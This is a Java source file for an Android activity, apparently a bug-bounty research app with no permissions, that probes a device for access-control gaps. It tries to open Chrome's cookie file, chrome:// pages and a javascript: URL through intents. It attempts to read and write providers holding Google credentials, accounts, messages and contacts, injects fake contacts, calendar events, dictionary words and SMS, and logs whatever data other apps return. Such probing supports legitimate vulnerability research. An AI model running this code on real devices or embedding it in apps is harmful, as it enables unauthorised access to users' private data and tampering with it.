package com.vrp.zeroperm;

import android.app.Activity;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.ParcelFileDescriptor;
import android.util.Log;

public class FinalProbeActivity extends Activity {
    private static final String T = "FINALPROBE";

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        Log.w(T, "=== Final Comprehensive Probe ===");
        Log.w(T, "UID=" + android.os.Process.myUid());

        testChromeURLsFromApp();
        testOpenFileAttacks();
        testMindfulNudge();
        testChromecast();
        testPlayStore();
        testInsertAttacks();
        testHealthConnect();
        testAndroid17NewAPIs();

        Log.w(T, "=== FINAL PROBE COMPLETE ===");
    }

    private void testChromeURLsFromApp() {
        Log.w(T, "--- Chrome URL attacks from zero-perm app ---");

        String[][] urls = {
            {"chrome://version", "Chrome version"},
            {"chrome://flags", "Chrome flags"},
            {"chrome://net-export", "Chrome net-export"},
            {"chrome://settings/passwords", "Chrome passwords"},
            {"chrome://signin-internals", "Chrome signin"},
            {"file:///data/data/com.android.chrome/app_chrome/Default/Cookies", "Chrome cookies"},
            {"file:///sdcard/", "SD card"},
            {"javascript:void(document.title)", "JavaScript exec"},
        };

        for (String[] url : urls) {
            try {
                Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse(url[0]));
                i.setPackage("com.android.chrome");
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(i);
                Log.w(T, "[+] Chrome loaded: " + url[1]);
            } catch (SecurityException se) {
                Log.w(T, "[-] Chrome SECURITY: " + url[1]);
            } catch (Exception e) {
                Log.w(T, "[-] Chrome " + url[1] + ": " + e.getClass().getSimpleName());
            }
        }
    }

    private void testOpenFileAttacks() {
        Log.w(T, "--- openFile/openAssetFile attacks ---");
        ContentResolver cr = getContentResolver();

        String[][] uris = {
            {"content://com.android.contacts/contacts/1/photo", "Contact photo"},
            {"content://com.android.contacts/profile/photo", "Profile photo"},
            {"content://media/external/audio/media", "Media audio"},
            {"content://com.google.android.gms/auth/credentials", "GMS credentials"},
            {"content://com.google.android.apps.docs/document/root", "Docs document"},
            {"content://com.google.android.apps.photos.contentprovider/", "Photos provider"},
            {"content://com.google.android.apps.messaging/threads", "Messages threads"},
            {"content://com.google.android.gms/accounts", "GMS accounts"},
        };

        for (String[] u : uris) {
            // Try openFile read
            try {
                ParcelFileDescriptor pfd = cr.openFileDescriptor(Uri.parse(u[0]), "r");
                if (pfd != null) {
                    long size = pfd.getStatSize();
                    Log.w(T, "[!!!] openFile READ " + u[1] + ": size=" + size);
                    pfd.close();
                }
            } catch (SecurityException se) {
                Log.w(T, "[-] openFile SECURITY: " + u[1]);
            } catch (java.io.FileNotFoundException fe) {
                // Normal
            } catch (Exception e) {
                Log.w(T, "[-] openFile " + u[1] + ": " + e.getClass().getSimpleName());
            }

            // Try openFile write
            try {
                ParcelFileDescriptor pfd = cr.openFileDescriptor(Uri.parse(u[0]), "w");
                if (pfd != null) {
                    Log.w(T, "[!!!] openFile WRITE " + u[1] + " SUCCEEDED — INTEGRITY VIOLATION");
                    pfd.close();
                }
            } catch (SecurityException se) {
                // Expected
            } catch (java.io.FileNotFoundException fe) {
                // Normal
            } catch (Exception e) {
                // Normal
            }

            // Try query (for comparison)
            try {
                android.database.Cursor c = cr.query(Uri.parse(u[0]), null, null, null, null);
                if (c != null && c.getCount() > 0) {
                    Log.w(T, "[!!!] query " + u[1] + ": " + c.getCount() + " rows");
                    c.close();
                }
            } catch (SecurityException se) {
                // Expected
            } catch (Exception e) {
                // Expected
            }
        }
    }

    private void testMindfulNudge() {
        Log.w(T, "--- Wellbeing MindfulNudge ---");
        try {
            Intent i = new Intent(Intent.ACTION_VIEW);
            i.setComponent(new ComponentName("com.google.android.apps.wellbeing",
                "com.google.android.apps.wellbeing.mindfulnudge.ui.MindfulNudgeActivityForWellbeingFunctions"));
            startActivityForResult(i, 1000);
            Log.w(T, "[+] MindfulNudge launched");
        } catch (SecurityException se) {
            Log.w(T, "[-] MindfulNudge SECURITY");
        } catch (Exception e) {
            Log.w(T, "[-] MindfulNudge: " + e.getClass().getSimpleName());
        }
    }

    private void testChromecast() {
        Log.w(T, "--- Chromecast Discovery ---");
        try {
            Intent i = new Intent(Intent.ACTION_VIEW);
            i.setComponent(new ComponentName("com.google.android.apps.chromecast.app",
                "com.google.android.apps.chromecast.app.DiscoveryActivity"));
            startActivityForResult(i, 1001);
            Log.w(T, "[+] Chromecast Discovery launched");
        } catch (Exception e) {
            Log.w(T, "[-] Chromecast: " + e.getClass().getSimpleName());
        }
    }

    private void testPlayStore() {
        Log.w(T, "--- Play Store Deep Links ---");
        try {
            Intent i = new Intent(Intent.ACTION_VIEW,
                Uri.parse("market://account"));
            i.setPackage("com.android.vending");
            startActivityForResult(i, 1002);
            Log.w(T, "[+] Play Store account launched");
        } catch (Exception e) {
            Log.w(T, "[-] Play Store account: " + e.getClass().getSimpleName());
        }

        try {
            Intent i = new Intent(Intent.ACTION_VIEW,
                Uri.parse("market://wishlist"));
            i.setPackage("com.android.vending");
            startActivityForResult(i, 1003);
            Log.w(T, "[+] Play Store wishlist launched");
        } catch (Exception e) {
            Log.w(T, "[-] Play Store wishlist: " + e.getClass().getSimpleName());
        }
    }

    private void testInsertAttacks() {
        Log.w(T, "--- Insert/Update Attacks ---");
        ContentResolver cr = getContentResolver();

        // Try inserting into contacts (without READ permission, maybe WRITE is separate?)
        try {
            android.content.ContentValues cv = new android.content.ContentValues();
            cv.put("display_name", "INJECTED_BY_ZEROPERM");
            Uri result = cr.insert(Uri.parse("content://com.android.contacts/raw_contacts"), cv);
            if (result != null) {
                Log.w(T, "[!!!] Contact INSERT succeeded: " + result);
            }
        } catch (SecurityException se) {
            Log.w(T, "[-] Contact insert SECURITY");
        } catch (Exception e) {
            Log.w(T, "[-] Contact insert: " + e.getClass().getSimpleName());
        }

        // Try inserting into calendar
        try {
            android.content.ContentValues cv = new android.content.ContentValues();
            cv.put("title", "INJECTED_EVENT");
            cv.put("dtstart", System.currentTimeMillis());
            cv.put("dtend", System.currentTimeMillis() + 3600000);
            cv.put("calendar_id", 1);
            Uri result = cr.insert(Uri.parse("content://com.android.calendar/events"), cv);
            if (result != null) {
                Log.w(T, "[!!!] Calendar INSERT succeeded: " + result);
            }
        } catch (SecurityException se) {
            Log.w(T, "[-] Calendar insert SECURITY");
        } catch (Exception e) {
            Log.w(T, "[-] Calendar insert: " + e.getClass().getSimpleName());
        }

        // Try inserting into user dictionary
        try {
            android.content.ContentValues cv = new android.content.ContentValues();
            cv.put("word", "INJECTED_WORD");
            cv.put("frequency", 255);
            Uri result = cr.insert(Uri.parse("content://user_dictionary/words"), cv);
            if (result != null) {
                Log.w(T, "[!!!] User dictionary INSERT succeeded: " + result);
            }
        } catch (SecurityException se) {
            Log.w(T, "[-] User dictionary insert SECURITY");
        } catch (Exception e) {
            Log.w(T, "[-] User dictionary insert: " + e.getClass().getSimpleName());
        }

        // Try inserting into SMS
        try {
            android.content.ContentValues cv = new android.content.ContentValues();
            cv.put("address", "1234567890");
            cv.put("body", "INJECTED_SMS");
            Uri result = cr.insert(Uri.parse("content://sms/inbox"), cv);
            if (result != null) {
                Log.w(T, "[!!!] SMS INSERT succeeded: " + result);
            }
        } catch (SecurityException se) {
            Log.w(T, "[-] SMS insert SECURITY");
        } catch (Exception e) {
            Log.w(T, "[-] SMS insert: " + e.getClass().getSimpleName());
        }
    }

    private void testHealthConnect() {
        Log.w(T, "--- Health Connect ---");
        try {
            Intent i = new Intent("android.health.connect.action.SHOW_MIGRATION_INFO");
            startActivity(i);
            Log.w(T, "[+] Health Connect migration info launched");
        } catch (Exception e) {
            Log.w(T, "[-] Health Connect migration: " + e.getClass().getSimpleName());
        }

        try {
            Intent i = new Intent("android.health.connect.action.MANAGE_HEALTH_DATA");
            startActivity(i);
            Log.w(T, "[+] Health Connect manage data launched");
        } catch (Exception e) {
            Log.w(T, "[-] Health Connect manage: " + e.getClass().getSimpleName());
        }
    }

    private void testAndroid17NewAPIs() {
        Log.w(T, "--- Android 17 Specific ---");

        // Test if any new system providers are accessible
        String[] newProviders = {
            "content://com.android.server.healthconnect/records",
            "content://com.android.healthconnect/records",
            "content://android.health.connect/records",
        };

        ContentResolver cr = getContentResolver();
        for (String uri : newProviders) {
            try {
                android.database.Cursor c = cr.query(Uri.parse(uri), null, null, null, null);
                if (c != null && c.getCount() > 0) {
                    Log.w(T, "[!!!] " + uri + ": " + c.getCount() + " rows!");
                    c.close();
                }
            } catch (SecurityException se) {
                Log.w(T, "[-] SECURITY: " + uri.substring(uri.lastIndexOf('/') + 1));
            } catch (Exception e) {
                Log.w(T, "[-] " + uri.substring(uri.lastIndexOf('/') + 1) + ": " + e.getClass().getSimpleName());
            }
        }

        // Check notification channels from other apps
        try {
            android.app.NotificationManager nm = (android.app.NotificationManager)
                getSystemService(NOTIFICATION_SERVICE);
            java.util.List<android.app.NotificationChannelGroup> groups =
                nm.getNotificationChannelGroups();
            Log.w(T, "[*] Own notification groups: " + groups.size());
        } catch (Exception e) {
            Log.w(T, "[-] NotifGroups: " + e.getClass().getSimpleName());
        }

        // Check PackageManager for installed packages (info leak?)
        try {
            java.util.List<android.content.pm.PackageInfo> pkgs =
                getPackageManager().getInstalledPackages(0);
            Log.w(T, "[*] Visible packages: " + pkgs.size());
            int googleCount = 0;
            for (android.content.pm.PackageInfo pi : pkgs) {
                if (pi.packageName.contains("google")) googleCount++;
            }
            Log.w(T, "[*] Google packages visible: " + googleCount);
        } catch (Exception e) {
            Log.w(T, "[-] InstalledPackages: " + e.getClass().getSimpleName());
        }
    }

    @Override
    protected void onActivityResult(int req, int res, Intent data) {
        super.onActivityResult(req, res, data);
        Log.w(T, "[RESULT] req=" + req + " res=" + res);
        if (data != null) {
            Log.w(T, "[!!!] DATA from req=" + req);
            if (data.getData() != null) Log.w(T, "  URI: " + data.getData());
            if (data.getExtras() != null) {
                try {
                    for (String key : data.getExtras().keySet()) {
                        try {
                            Object val = data.getExtras().get(key);
                            String valStr = val != null ? val.toString() : "null";
                            Log.w(T, "  " + key + " = " + valStr.substring(0, Math.min(valStr.length(), 200)));
                        } catch (Exception ex) {
                            Log.w(T, "  " + key + " = [error]");
                        }
                    }
                } catch (Exception ex) {
                    Log.w(T, "  bundle error");
                }
            }
        }
    }

    private String shortMsg(Exception e) {
        String msg = e.getMessage();
        if (msg == null) return "";
        return msg.substring(0, Math.min(msg.length(), 120));
    }
}
